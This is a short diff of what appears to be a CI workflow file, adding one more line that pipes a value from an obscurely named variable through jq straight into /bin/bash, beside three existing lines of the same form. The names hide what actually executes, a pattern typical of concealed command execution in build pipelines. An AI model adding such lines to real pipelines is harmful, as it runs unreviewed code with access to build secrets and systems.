@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$bhu09" | jq -r .pfad72619 | /bin/bash
           echo $kxsx0 | jq -r .k28 | /bin/bash
           echo $bwnq594 | jq -r .lmco05 | /bin/bash
+          echo $e0 | jq -r .ijjs925 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
